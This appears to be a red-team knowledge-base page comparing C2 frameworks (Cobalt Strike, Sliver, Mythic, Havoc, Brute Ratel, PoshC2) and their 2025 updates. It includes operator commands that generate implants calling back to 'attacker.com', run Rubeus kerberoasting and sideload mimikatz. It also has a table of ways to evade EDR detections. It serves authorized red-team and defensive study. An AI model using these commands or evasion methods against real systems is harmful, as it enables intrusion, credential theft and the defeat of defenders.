# C2 Framework Comparison

> **MITRE ATT&CK**: Command and Control > T1071 - Application Layer Protocol
> **Platforms**: Windows, Linux, macOS (varies by framework)
> **Required Privileges**: User (implant execution)
> **OPSEC Risk**: Varies by framework configuration, profile, and operator discipline

## Strategic Overview

Selecting the right C2 framework is one of the most consequential decisions a Red Team Lead makes before an engagement. The framework determines your payload flexibility, communication resilience, OPSEC capabilities, and operational overhead. There is no universally "best" C2 -- each has trade-offs. Cobalt Strike remains the industry standard for its maturity and Malleable C2 profiles, but its signature prevalence means it is the most-detected framework. Open-source alternatives like Sliver and Mythic offer excellent capabilities without licensing costs. The trend is toward using multiple frameworks in a single engagement: one for initial access and a different, stealthier one for long-term persistence.

**Selection criteria**: Target's defensive maturity -> Engagement duration -> Required platforms -> Operator team size -> Budget -> Required features (BOFs, lateral movement, pivoting).

## Technical Deep-Dive

### Cobalt Strike

```
Category: Commercial ($3,500/yr) | Platforms: Windows (primary) | Protocols: HTTP/S, DNS, SMB, TCP
Payload: Beacon (reflective DLL) | OPSEC: High (with custom Malleable C2 profile)

beacon> sleep 60 30                  # 60s callback, 30% jitter
beacon> inline-execute mybof.o      # Run BOF in-process (no fork and run)
beacon> execute-assembly Rubeus.exe  # .NET assembly in-memory
beacon> spawn x64 smb-listener      # SMB pivot beacon
# Malleable C2: Custom profiles mimic Gmail, Slack, OneDrive traffic patterns
```

### Sliver

```
Category: Open-source (BishopFox) | Platforms: Win/Linux/macOS | Protocols: mTLS, HTTP/S, DNS, WireGuard
Payload: Go binary implant | OPSEC: Medium-High | Features: Multiplayer, BOF support, extensions

sliver> generate --mtls attacker.com:443 --os windows --arch amd64 --save implant.exe
sliver> generate --http attacker.com --os linux --save implant
sliver (IMPLANT)> execute-assembly /path/to/Rubeus.exe kerberoast
sliver (IMPLANT)> sideload /path/to/mimikatz.dll
sliver (IMPLANT)> pivots tcp --bind 0.0.0.0:4444    # Pivot listener
```

### Mythic

```
Category:       Open-source (its_a_feature_)
Platforms:      Windows, Linux, macOS (agent-dependent)
Protocols:      HTTP(S), TCP, SMB, WebSocket (agent-dependent)
Payload:        Multiple agent types
Key Features:   Web UI, extensible agent architecture, SOCKS proxy, file browser, credential tracking
OPSEC Level:    Medium-High (agent-dependent)

Key Agents:
  - Apollo (Windows, C#): .NET agent with extensive post-ex capabilities
  - Poseidon (Linux/macOS, Go): Cross-platform Go agent
  - Medusa (Python): Python-based agent for quick deployment
  - Athena (Windows/Linux, C#/.NET): Cross-platform .NET agent

# Deploy Mythic
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo
sudo ./mythic-cli start

# Agent generation via web UI at https://mythic-server:7443
# Task execution through browser-based interface
# Built-in SOCKS proxy, credential management, artifact tracking
```

### Havoc

```
Category:       Open-source (C5pिder)
Platforms:      Windows (primary), Linux
Protocols:      HTTP(S), SMB
Payload:        Demon (position-independent code)
Key Features:   BOF support, sleep obfuscation (Ekko/Zilean), syscall evasion, token manipulation
OPSEC Level:    High

# Demon features
- Sleep obfuscation: Encrypts beacon memory during sleep (Foliage, Ekko)
- Indirect syscalls: Avoids ntdll hooks from EDR
- Stack spoofing: Hides call stack from thread analysis
- Module stomping: Loads into legitimate DLL memory space

# Generate demon via Havoc GUI
# Configure listener with custom headers, URIs, user agents
# BOF execution: inline, no fork-and-run overhead
```

### Brute Ratel

```
Category:       Commercial ($2,500/user/year)
Platforms:      Windows, Linux
Protocols:      HTTP(S), DNS, SMB, TCP
Payload:        Badger
Key Features:   Designed for EDR evasion, syscalls, sleep encryption, no fork-and-run
OPSEC Level:    Very High (designed specifically to evade modern EDR)

Key Differentiators:
  - No use of ntdll.dll for syscalls (avoids userland hooks)
  - Sleep mask with encrypted heap and stack
  - Built-in LDAP sentinel for AD enumeration
  - Profile-based C2 communication (similar to Malleable C2)
  - No reflective DLL injection (avoids common detection)
```

### PoshC2

```
Category:       Open-source (Nettitude)
Platforms:      Windows (PowerShell), Linux (Python), macOS (JXA)
Protocols:      HTTP(S)
Key Features:   Proxy-aware, daisy chaining, multi-user, built-in modules
OPSEC Level:    Medium
# Install: git clone + ./Install.sh, then posh-project -n NAME, posh-server, posh
```

### Framework Comparison Table

| Feature | Cobalt Strike | Sliver | Mythic | Havoc | Brute Ratel | PoshC2 |
|---------|:---:|:---:|:---:|:---:|:---:|:---:|
| **Price** | $3,500/yr | Free | Free | Free | $2,500/yr | Free |
| **Windows** | Excellent | Good | Good | Excellent | Excellent | Good |
| **Linux** | Limited | Native | Good | Basic | Good | Good |
| **macOS** | Limited | Native | Good | No | No | JXA |
| **BOF Support** | Native | Yes | Agent-dep | Yes | Yes | No |
| **Sleep Obfuscation** | Sleepmask Kit | No | Agent-dep | Yes (Ekko) | Yes | No |
| **Malleable Profiles** | Yes | Partial | Agent-dep | Yes | Yes | Limited |
| **DNS C2** | Yes | Yes | Agent-dep | No | Yes | No |
| **Multiplayer** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Extensibility** | BOFs, kits | Extensions | Custom agents | BOFs | BOFs | Modules |
| **Detection Risk** | High (widely signatured) | Medium | Low-Medium | Medium | Low | Medium |
| **Community/Docs** | Excellent | Good | Good | Growing | Limited | Good |

## Detection & Evasion

| Framework Indicator | Detection Method | Evasion |
|-------------------|-----------------|---------|
| Default Cobalt Strike profile | Network signatures, JA3/JA3S | Custom Malleable C2 profile, HTTPS with valid cert |
| Named pipe patterns | Sysmon pipe events (17/18) | Custom pipe names in profile |
| Reflective DLL loading | ETW, in-memory scanning | Module stomping, BOFs instead of fork-and-run |
| Beacon memory patterns | Periodic memory scanning by EDR | Sleep encryption (sleepmask kit, Ekko) |
| Process injection | ETW, kernel callbacks | Direct syscalls, avoid cross-process injection |

**Operational guidance**: Use Cobalt Strike or Brute Ratel against mature targets with strong EDR. Use Sliver or Mythic when budget is limited but capability needs are high. Run multiple C2 frameworks -- one noisy one for initial access that can be burned, and a quiet one for persistent access.

---

## 2025 Framework Updates & New Entrants

### Usage Rankings (Q2 2025, Kaspersky/AlphaHunt)

```
# Most frequently used C2 frameworks in real-world attacks (in order):
# 1. Sliver (overtook Cobalt Strike as #1)
# 2. Havoc
# 3. Metasploit
# 4. Mythic
# 5. Brute Ratel C4
# 6. Cobalt Strike
# Trend: Shift toward modular, open-source frameworks with cloud integration

# Note: Palo Alto can now detect Sliver over TLSv1.3 via neural network
# analysis of TLS handshake patterns. JA3/JA4 randomization essential.
```

### AdaptixC2 -- New Open-Source Post-Exploitation Framework

```
# Released January 2025, widely adopted by October 2025
# Golang server + C++ QT cross-platform GUI
# Features: RFC-compliant SOCKS4/5 (IPv6 support), async client-server,
#   Extension-Kit with BOFs for LDAP recon and DCSync,
#   SSH-like Remote Terminal, session graph
# Weaponized by Russian ransomware gangs by October 2025
# github.com/nicosec/AdaptixC2
```

### Cobalt Strike 4.12 (November 2025) -- Major Release

```
# REST API (beta): Scripting from any language
# UDC2 (User Defined C2): Custom C2 channels as BOFs (e.g., ICMP, any protocol)
#   Open-sourced ICMP UDC2 reference implementation + dev framework
# Four new injection BOFs: RtlCloneUserProcess, TpDirect,
#   TpStartRoutineStub, EarlyCascade
# New UAC bypass techniques
# Redesigned GUI with multiple themes
# Requires Java 17+
```

### Brute Ratel C4 v2.2-2.3 (2025)

```
# v2.2 (Rinnegan, May 2025): Complete Badger rewrite, new BOF APIs,
#   Python library (bruteratel.py) with asyncio WebSocket,
#   in-memory encrypted .NET assembly store (up to 10 assemblies)
# v2.3 (Flux, October 2025): Custom-built compiler (eliminates compiler signatures),
#   Safe HTTP: 2-3KB PIC stub sends HTTP with valid call stack while
#   entire Badger code + heap encrypted,
#   coffexec_async: async BOF execution while Badger hidden,
#   Multiple .NET versions simultaneously in single Badger
```

### Kharon -- Fully PIC Agent for Mythic/AdaptixC2

```
# First fully Position-Independent Code implant for Mythic and AdaptixC2
# Operates without reflective loader
# Features: sleep obfuscation, heap obfuscation, stack spoofing + indirect syscalls,
#   BOF API proxy, AMSI/ETW bypass, lateral movement (WMI, SCM, WinRM, DCOM)
# Supports dotnet/powershell/shellcode/BOF in-memory execution
# github.com/MythicAgents/Kharon-Mtc
```

### Novel C2 Channels (2025)

```
# HazyBeacon: AWS Lambda function URLs over HTTPS as C2
#   First use of serverless function URLs (not just APIs) for C2
#   Traffic goes to trusted on.aws / amazonaws.com domains
#   DLL sideloading delivery; Google Drive/Dropbox for exfil
#   Unit 42, July 2025

# Havoc + SharePoint: Modified Havoc Demon uses Microsoft Graph API
#   Creates and reads files on attacker-controlled SharePoint
#   All C2 traffic appears as legitimate SharePoint/Graph API usage
#   FortiGuard Labs, March 2025

# Cobalt Strike UDC2 ICMP: Reference implementation for custom C2 over ICMP
#   Operators can now build C2 over ANY protocol without modifying Beacon source
```

---

## Cross-References

- [C2 Infrastructure Design](./c2-infrastructure.md)
- [DNS C2](./dns-c2.md)
- [Covert Channels](./covert-channels.md)
- **AV/EDR Evasion** (06-defense-evasion/av-edr-evasion.md) -- C2 evasion capabilities
- **ClickFix Execution** (03-execution/clickfix-execution.md) -- Havoc deployed via ClickFix + SharePoint

## References

- Cobalt Strike: https://www.cobaltstrike.com/
- Sliver: https://github.com/BishopFox/sliver
- Mythic: https://github.com/its-a-feature/Mythic
- Havoc: https://github.com/HavocFramework/Havoc
- Brute Ratel: https://bruteratel.com/
- PoshC2: https://github.com/nettitude/PoshC2
- C2 Matrix: https://www.thec2matrix.com/
- AdaptixC2: https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/
- Cobalt Strike 4.12: https://www.cobaltstrike.com/blog/cobalt-strike-412-fix-up-look-sharp
- Brute Ratel v2.3: https://bruteratel.com/release/2025/10/07/Release-Flux/
- Kharon: https://github.com/MythicAgents/Kharon-Mtc
- HazyBeacon: https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/
- Palo Alto Sliver Detection: https://docs.paloaltonetworks.com/whats-new/new-features/july-2025/sliver-c2-detection-for-advanced-threat-prevention
